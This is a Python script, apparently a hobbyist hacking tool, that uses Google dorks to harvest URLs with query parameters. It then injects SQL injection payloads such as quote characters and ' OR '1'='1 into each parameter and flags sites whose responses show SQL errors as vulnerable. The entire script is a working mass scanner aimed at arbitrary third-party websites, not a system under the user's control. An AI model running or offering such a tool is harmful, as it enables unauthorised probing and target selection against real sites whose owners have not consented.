import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from googlesearch import search
from colorama import init, Fore, Style

# Initialize colorama
init()

def print_banner():
    banner = """
        Made By Unrealisedd                                     
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)

def get_google_dorking_parameter():
    dork = input('Enter the Google dorking parameter (e.g., inurl:"?id="): ')
    return dork

def get_number_of_requests():
    while True:
        try:
            num_requests = int(input("Enter the number of requests to make: "))
            return num_requests
        except ValueError:
            print("Please enter a valid number.")

def fetch_urls(dork, num_requests):
    urls = []
    try:
        for url in search(dork, num_results=num_requests):
            urls.append(url)
    except Exception as e:
        print(f"An error occurred while fetching URLs: {e}")
    return urls

def is_vulnerable_to_sqli(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in query_params:
        for payload in ["'", '"', "''", '""', "' OR '1'='1", '" OR "1"="1']:
            query_params_copy = query_params.copy()
            query_params_copy[param] = [payload]

            new_query = urlencode(query_params_copy, doseq=True)
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))

            try:
                response = requests.get(test_url, timeout=5, allow_redirects=False)
                if response.status_code in [301, 302, 303, 307, 308]:
                    continue
                if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                    return True
            except requests.exceptions.RequestException as e:
                print(f"An error occurred while testing URL: {e}")
    return False

def main():
    print_banner()
    dork = get_google_dorking_parameter()
    num_requests = get_number_of_requests()
    urls = fetch_urls(dork, num_requests)

    print(f"Testing {len(urls)} URLs for SQL injection vulnerabilities...")

    for url in urls:
        print(f"Testing URL: {url}")
        if is_vulnerable_to_sqli(url):
            print(Fore.GREEN + f"Vulnerable to SQL injection: {url}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Not vulnerable to SQL injection: {url}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
